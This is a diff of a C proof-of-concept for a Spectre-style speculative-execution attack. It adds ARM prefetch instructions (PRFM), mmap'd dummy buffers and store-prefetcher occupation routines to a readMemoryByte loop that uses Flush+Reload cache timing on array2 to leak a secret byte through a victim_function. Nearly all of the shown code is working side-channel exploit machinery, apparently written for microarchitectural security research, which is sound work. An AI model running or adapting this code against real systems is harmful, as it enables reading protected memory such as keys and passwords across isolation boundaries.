@@ -4,7 +4,8 @@
 #include <string.h>
 #include <time.h>
 #include <unistd.h>
-
+// #include <unistd.h>
+#include "../until.h"
 
 // 1. 计时器封装
 static inline uint64_t get_time(void) {
@@ -65,6 +66,21 @@ uint8_t unused2[64];
 // uint8_t array2[256 * 64]; 
 uint8_t array2[256 * 64] __attribute__((aligned(4096)));;
 
+#ifndef DUMMY_BUFFER_PAGES
+#define DUMMY_BUFFER_PAGES 64
+#endif
+
+#define DUMMY_BUFFER_SIZE (PAGE_SIZE * DUMMY_BUFFER_PAGES)
+#define PREFETCHER_FILL_BUFFER_SIZE (PAGE_SIZE * DUMMY_BUFFER_PAGES)
+
+static uint8_t* dummy_buffer;
+static uint8_t* prefetcher_fill_buffer;
+
+void dummyAccesses(void){
+    for(uint32_t j = 0; j < DUMMY_BUFFER_SIZE; j+=64){
+        asm volatile("PRFM PLDL1KEEP, [%0]\n\t" :: "r"(&dummy_buffer[j]));
+     }
+}
 
 // char *secret = "s";
 // set secret value = int SECRET_VALUE
@@ -95,9 +111,53 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     volatile uint8_t *addr;
 
     for (i = 0; i < 256; i++) results[i] = 0;
+    for (i = 0; i < 256; i++) probe_times[i] = 0;
 
+    // for (tries = TRY_COUNT; tries > 0; tries--) {
+
+    //     dummyAccesses();
+
+    //    occupy_store_prefetcher_entries(prefetcher_fill_buffer,
+    //                                         DUMMY_BUFFER_PAGES, 1);
+    //     for (i = 0; i < 256; i++)
+    //         flush_memory(&array2[i * 64]);
+
+    //     mfence();
+    //     for(int step = 0; step < 6;step++){
+    //        array2[8 * step * 64] = 21;
+    //     //    nops();
+    //     }
+    //     // addr = array2 + (8 * 0 * 64);
+    //     //
+    //     int probe_index = (tries) % 256;// 0-255
+    //     addr = &array2[probe_index * 64];
+    //     time1 = get_time();
+    //     // junk = *addr; // 访问内存
+    //     _mStore(addr, 17);
+    //     memory_barrier(); // 确保读完了再计时
+    //     time2 = get_time() - time1;
+    //     // printf("In Non-spec test, access array2[8*10*64] took %llu ns\n", time2);
+    //     results[probe_index] += time2;
+    //     probe_times[probe_index] += 1;
+    // }
+
+    // for(int i=0;i<256;i++){
+    //     printf("results[%d] = %d\n", i, results[i] /= probe_times[i]); // 取平均
+    //     // printf("results[%d] = %d, array2[%d * 64] = %d\n", i, results[i] /= probe_times[i], i, array2[i*64]); // 取平均
+    // }
+
+
+    for (i = 0; i < 256; i++) results[i] = 0;
+    for (i = 0; i < 256; i++) probe_times[i] = 0;
+
+    printf("!!!!!!!!!!!!!!!!!!!!!!\n");
     // 尝试多次以消除噪声
     for (tries = TRY_COUNT; tries > 0; tries--) {
+
+        dummyAccesses();
+
+       occupy_store_prefetcher_entries(prefetcher_fill_buffer,
+                                            DUMMY_BUFFER_PAGES, 1);
 
         // 1. FLUSH array2 (准备 Reload)
         for (i = 0; i < 256; i++)
@@ -116,13 +176,13 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
             // 调用受害者函数
             for (i = 0; i < 256; i++) flush_memory(&array2[i * 64]);
 
-#if TEST_ON_HIT
+#if TEST_ON_HIT == 1
     int temp = array2[8 * 0 *64];
     int temp2 = array2[8 * 5 *64];  
     int temp3 = array2[8 * 2 *64];
-    int temp4 = array2[8 * 1 *64];
-    int temp5 = array2[8 * 4 *64];
-    int temp6 = array2[8 * 3 *64];      
+    // int temp4 = array2[8 * 1 *64];
+    // int temp5 = array2[8 * 4 *64];
+    // int temp6 = array2[8 * 3 *64];      
 #endif
             flush_memory(&array1_size);
             victim_function(x);
@@ -154,10 +214,27 @@ int main(int argc, const char * * argv) {
     printf("Reading %d bytes:\n", SECRET_LEN);
     printf("The secret value is set to %d\n", *secret);
 
+
      /* Default addresses to read is 40 (which is the length of the secret string) */
     // 初始化 array2
     for (size_t i = 0; i < sizeof(array2); i++)
         array2[i] = 1; 
+
+    for (int i = 0; i < 256; i++)
+            flush_memory(&array2[i * 64]);
+
+    dummy_buffer = (uint8_t*)mmap(NULL, DUMMY_BUFFER_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, 0, 0);
+    if(dummy_buffer == MAP_FAILED) {
+        printf("failed to map memory to access!\n");
+        exit(1);
+    }
+  // mfence();
+
+  prefetcher_fill_buffer = (uint8_t*)mmap(NULL, PREFETCHER_FILL_BUFFER_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, 0, 0);
+  if(prefetcher_fill_buffer == MAP_FAILED) {
+      printf("failed to map prefetcher fill buffer!\n");
+      exit(1);
+  }
 
     // 计算 secret 相对于 array1 的偏移量
     // 假设 secret 存储在 array1 之后的某个位置
